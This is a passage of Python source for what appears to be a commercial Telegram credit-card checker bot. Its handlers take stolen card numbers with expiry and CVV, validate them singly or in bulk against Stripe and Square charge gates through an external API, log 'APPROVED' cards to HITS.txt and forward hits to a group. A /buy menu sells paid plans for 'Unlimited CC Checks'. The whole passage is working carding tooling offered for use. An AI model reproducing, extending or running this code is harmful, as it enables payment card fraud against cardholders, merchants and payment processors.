│ ⏱️ Time: {processing_time:.2f} S
└───────────────
"""
                    try:
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=status_text,
                            parse_mode='HTML'
                        )
                    except:
                        pass
                
                # Send to users
                for user_id in all_users:
                    try:
                        bot.send_message(user_id, broadcast_msg, parse_mode='HTML')
                        success += 1
                    except Exception as e:
                        failed += 1
                        print(f"Failed to send to user {user_id}: {str(e)}")
                    
                    # Update status periodically
                    if (success + failed + errors) % 5 == 0:
                        update_status()
                
                # Send to groups
                for group_id in all_groups:
                    try:
                        bot.send_message(group_id, broadcast_msg, parse_mode='HTML')
                        success += 1
                    except Exception as e:
                        if "chat not found" in str(e).lower() or "bot was kicked" in str(e).lower():
                            failed += 1
                        else:
                            errors += 1
                        print(f"Failed to send to group {group_id}: {str(e)}")
                    
                    # Update status periodically
                    if (success + failed + errors) % 5 == 0:
                        update_status()
                
                # Final update
                update_status()
            
            except Exception as e:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ Broadcast failed: {str(e)}"
                )
        
        # Start broadcast in background thread
        threading.Thread(target=do_broadcast, daemon=True).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle /buy command
@bot.message_handler(commands=['buy'])
def handle_buy(message):
    plans_text = """
┏━━━━━━━⍟
┃ 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐏𝐥𝐚𝐧𝐬
┗━━━━━━━━━━━⊛
━━━━━━━━━━━━━━━━━━
➤ 7 Days Plan - $3 💰
✧ Unlimited CC Checks
✧ No Flood Control
✧ Standard Support
✧ Rank : Basic Plan
✧ Use in DMs
✧ Increased mass check limit (30)
─━─━─━─━─━─
➤ 15 Days Plan - $6 💰
✧ Unlimited CC Checks
✧ No Flood Control
✧ Priority Support
✧ Access to Private BINs
✧ Rank : Standard Plan
✧ Use in DMs
✧ Increased mass check limit (30)
─━─━─━─━─━─
➤ 30 Days Plan - $10 💰
✧ Unlimited CC Checks
✧ No Flood Control
✧ VIP Support (Faster Response)
✧ Access to Private BINs
✧ Early Access to New Features
✧ Rank : Primium Plan
✧ Use in DMs
✧ Increased mass check limit (30)
─━─━─━─━─━─
✧ Payment Method:
💳 UPI ID: <code>DM</code>
📩 Contact: @darkboy336 to purchase
━━━━━━━━━━━━━━━━━━
"""
    bot.reply_to(message, plans_text, parse_mode='HTML')

# Handle both /bin and .bin
@bot.message_handler(commands=['bin'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.bin'))
def handle_bin(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    try:
        # Extract BIN from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /bin BIN or .bin BIN")
                return
            bin_number = parts[1]
        else:  # starts with .
            bin_number = message.text[5:].strip()  # remove ".bin "
        
        if len(bin_number) < 6:
            bot.reply_to(message, "❌ BIN must be at least 6 digits")
            return
            
        status_msg = bot.reply_to(message, "🔍 Looking up BIN information...")
        
        def lookup_bin():
            try:
                bin_info = get_bin_info(bin_number[:6])
                if not bin_info:
                    bot.edit_message_text(chat_id=message.chat.id,
                                        message_id=status_msg.message_id,
                                        text="❌ Could not retrieve BIN information. Please try again.")
                    return
                
                response = f"""
┏━━━━━━━⍟
┃ BIN Information
┗━━━━━━━━━━━⊛

✧ 𝐁𝐈𝐍 ➳ <code>{bin_number[:6]}</code>  
✧ 𝐁𝐚𝐧𝐤 ➳ <code>{bin_info.get('bank', 'N/A')}</code>  
✧ 𝐁𝐫𝐚𝐧𝐝 ➳ <code>{bin_info.get('brand', 'N/A')}</code>  
✧ 𝐓𝐲𝐩𝐞 ➳ <code>{bin_info.get('type', 'N/A')}</code>  
✧ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ <code>{bin_info.get('country_name', 'N/A')}</code> {bin_info.get('country_flag', '🌐')}  
✧ 𝐋𝐞𝐯𝐞𝐥 ➳ <code>{bin_info.get('level', 'N/A')}</code>  

✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 ➳ <code>{message.from_user.first_name}</code>

"""
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response,
                                    parse_mode='HTML')
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}")
        
        threading.Thread(target=lookup_bin).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['unsub'])
def handle_unsub(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Format: /unsub USER_ID")
            return
            
        user_id = parts[1]
        
        if user_id in SUBSCRIBED_USERS:
            del SUBSCRIBED_USERS[user_id]
            # Save to Firebase
            write_firebase("subscribed_users", SUBSCRIBED_USERS)
            bot.reply_to(message, f"✅ User {user_id} unsubscribed successfully!")
        else:
            bot.reply_to(message, f"❌ User {user_id} is not subscribed.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['ungrant'])
def handle_ungrant(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Format: /ungrant GROUP_ID")
            return

        group_id = parts[1]

        if group_id in APPROVED_GROUPS:
            APPROVED_GROUPS.remove(group_id)

            # Update Firebase
            write_firebase("approved_groups", list(APPROVED_GROUPS))

            # Optional: update local file (clear and rewrite all)
            with open('approved_groups.txt', 'w') as f:
                for gid in APPROVED_GROUPS:
                    f.write(f"{gid}\n")

            bot.reply_to(message, f"✅ Group {group_id} removed from approved list!")
        else:
            bot.reply_to(message, f"❌ Group {group_id} is not in the approved list.")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


@bot.message_handler(commands=['res'])
def handle_res(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Format: /res USER_ID TIME\nExample: /res 123456 1d (1 day)\nOr: /res 123456 2h (2 hours)\nOr: /res 123456 30m (30 minutes)")
            return
            
        user_id = parts[1]
        time_str = parts[2].lower()
        
        # Calculate seconds based on input
        if time_str.endswith('d'):  # days
            seconds = int(time_str[:-1]) * 86400
            time_text = f"{time_str[:-1]} day(s)"
        elif time_str.endswith('h'):  # hours
            seconds = int(time_str[:-1]) * 3600
            time_text = f"{time_str[:-1]} hour(s)"
        elif time_str.endswith('m'):  # minutes
            seconds = int(time_str[:-1]) * 60
            time_text = f"{time_str[:-1]} minute(s)"
        else:
            bot.reply_to(message, "❌ Invalid time format. Use d=days, h=hours, m=minutes")
            return
            
        expiry_time = time.time() + seconds
        BANNED_USERS[user_id] = expiry_time
        
        # Save to file
        with open('banned_users.json', 'w') as f:
            json.dump(BANNED_USERS, f)
            
        bot.reply_to(message, f"✅ User {user_id} restricted for {time_text}!")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['unres'])
def handle_unres(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Format: /unres USER_ID")
            return
            
        user_id = parts[1]
        
        if user_id in BANNED_USERS:
            del BANNED_USERS[user_id]
            with open('banned_users.json', 'w') as f:
                json.dump(BANNED_USERS, f)
            bot.reply_to(message, f"✅ User {user_id} unrestricted successfully!")
        else:
            bot.reply_to(message, f"❌ User {user_id} is not restricted.")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")



# Handle both /chk and .chk
@bot.message_handler(commands=['chk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.chk'))
def handle_chk(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.Send Username & Chat Id of this Group Here @WasDarkboy To get approved")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        cc = None
        
        # Check if command is empty (either '/chk' or '.chk' without arguments)
        if (message.text.startswith('/chk') and len(message.text.split()) == 1) or \
           (message.text.startswith('.chk') and len(message.text.strip()) == 4):
            
            # Check if this is a reply to another message
            if message.reply_to_message:
                # Search for CC in replied message text
                replied_text = message.reply_to_message.text
                # Try to find CC in common formats
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    # Clean the CC (remove spaces and dashes)
                    cc = matches[0].replace(' ', '').replace('-', '')
                    # Check if we have full card details (number|mm|yyyy|cvv)
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            # Normal processing for commands with arguments
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Invalid format. Use /chk CC|MM|YYYY|CVV or .chk CC|MM|YYYY|CVV")
                    return
                cc = parts[1]
            else:  # starts with .
                cc = message.text[5:].strip()  # remove ".chk "

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe Auth</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc), parse_mode='HTML')

        def check_card():
            try:
                result = check_new_api_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')

                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mchk and .mchk
@bot.message_handler(commands=['mchk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mchk'))
def handle_mchk(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        # Check credits for non-subscribed users
        if not is_user_subscribed(message.from_user.id):
            if not check_user_credits(message.from_user.id, len(cards)):
                remaining = get_remaining_credits(message.from_user.id)
                bot.reply_to(message, f"❌ Not enough credits. You need {len(cards)} credits but only have {remaining} left today. Subscribe or wait for daily reset.")
                return
            deduct_credits(message.from_user.id, len(cards))
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_new_api_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway':'Stripe Auth'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_st_cc(cc):
    try:
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [x.strip() for x in card.split('|') if x.strip()]
        if len(parts) < 4:
            return {
                'status': 'ERROR', 'card': cc, 'message': 'Invalid format',
                'brand': 'UNKNOWN', 'country': 'UNKNOWN 🌐', 'type': 'UNKNOWN',
                'gateway': 'Stripe [5$]'
            }

        cc_num, mm, yy_raw, cvv = parts[:4]
        mm = mm.zfill(2)
        yy = yy_raw[2:] if yy_raw.startswith("20") else yy_raw
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'
        try:
            bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
            brand = bin_data.get('brand', 'UNKNOWN')
            country_name = bin_data.get('country_name', 'UNKNOWN')
            country_flag = bin_data.get('country_flag', '🌐')
            card_type = bin_data.get('type', 'UNKNOWN')
            bank = bin_data.get('bank', 'UNKNOWN')
        except: pass

        res = requests.get(f"https://app-py-8xke.onrender.com/gate=5/key=waslost/cc={formatted_cc}", timeout=300)
        data = res.json() if res.status_code == 200 else {}
        status = data.get("status", "DECLINED").upper()
        msg = data.get("response", "No response from gateway.")

        if "APPROVED" in status:
            status = "APPROVED"
            with open("HITS.txt", "a") as f: f.write(formatted_cc + "\n")
        elif "DECLINED" in status:
            status = "DECLINED"
        elif "CCN" in msg.upper():
            status = "CCN"
        else:
            status = "ERROR"

        return {
            'status': status, 'card': formatted_cc, 'message': msg,
            'brand': brand, 'country': f"{country_name} {country_flag}",
            'type': card_type, 'gateway': 'Stripe [5$]'
        }

    except Exception as e:
        return {
            'status': 'ERROR', 'card': cc, 'message': f"Exception: {str(e)}",
            'brand': 'UNKNOWN', 'country': 'UNKNOWN 🌐', 'type': 'UNKNOWN',
            'gateway': 'Stripe [5$]'
        }


@bot.message_handler(commands=['st'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.st'))
def handle_st(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from message or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    cc = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /st CC|MM|YYYY|CVV or .st CC|MM|YYYY|CVV")
                    return
            else:
                cc = parts[1]
        else:
            cc = message.text[4:].strip()

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe[5$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_st_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto forward hits
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - /st] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['mst'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mst'))
def handle_mst(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command only works in group or if subscribed.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ Checker is offline. Follow @Darkboy336.")
        return

    if not is_user_subscribed(message.from_user.id):
        return bot.reply_to(message, "❌ Only for subscribed users.")

    if not check_mass_check_cooldown(message.from_user.id):
        return bot.reply_to(message, "⚠️ Slow down! Wait before next mass check.")

    try:
        raw_text = None
        if len(message.text.split()) > 1:
            raw_text = message.text.split(' ', 1)[1]
        elif message.reply_to_message:
            raw_text = message.reply_to_message.text

        if not raw_text:
            return bot.reply_to(message, "❌ No cards provided. Paste or reply to card list.")

        cards = list(set(re.findall(r"\d{12,19}[\|:\/ ]\d{1,2}[\|:\/ ]\d{2,4}[\|:\/ ]\d{3,4}", raw_text)))
        limit = MAX_SUBSCRIBED_CARDS_LIMIT
        cards = cards[:limit]

        if not cards:
            return bot.reply_to(message, "❌ No valid cards found.")

        start_time = time.time()
        user_full_name = message.from_user.first_name + (f" {message.from_user.last_name}" if message.from_user.last_name else "")
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')

        def check_cards():
            results = []
            for i, card in enumerate(cards, 1):
                try:
                    result = check_st_cc(card)
                    result['user_id'] = message.from_user.id
                    results.append(result)
                    if result['status'] == 'APPROVED':
                        bot.send_message(HITS_GROUP_ID, f"✅ HIT via /mst:\n<code>{result['card']}</code>", parse_mode='HTML')
                except Exception as e:
                    results.append({'status': 'ERROR', 'card': card, 'message': str(e), 'brand': 'UNKNOWN', 'country': 'UNKNOWN 🌐', 'type': 'UNKNOWN', 'gateway': 'Stripe [5$]'})

                response_text = format_mchk_response(results, len(cards), time.time() - start_time, i)
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id, text=response_text, parse_mode='HTML')

        threading.Thread(target=check_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Handle both /sq and .sq
@bot.message_handler(commands=['sq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sq'))
def handle_sq(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from input
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /sq CC|MM|YYYY|CVV or .sq CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:
            cc = message.text[4:].strip()  # remove ".sq "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe + Square [0.20$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_square_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Send result to user
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send to hits group if approved
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /msq and .msq
@bot.message_handler(commands=['msq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msq'))
def handle_msq(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is dead now, follow @Darkboy336 for more!!")
        return
    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_square_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Stripe + Square [0.20$]'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle both /b3 and .b3
@bot.message_handler(commands=['b3'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.b3'))
def handle_b3(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
